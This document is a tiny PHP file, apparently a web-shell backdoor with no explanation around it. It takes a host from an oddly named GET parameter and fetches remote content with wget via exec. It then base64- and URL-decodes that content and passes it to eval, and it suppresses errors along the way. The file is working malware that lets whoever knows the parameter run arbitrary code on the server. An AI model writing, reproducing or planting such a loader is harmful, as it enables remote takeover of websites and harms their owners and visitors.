<?php

$r = 'https://'.@$_GET['kqd59u261nspag'];
@exec("wget $r -qO-", $b);
$p = base64_decode($b[0]);
$k = urldecode($p);
$q = '?>';
$a = $q.$k;
eval($a);
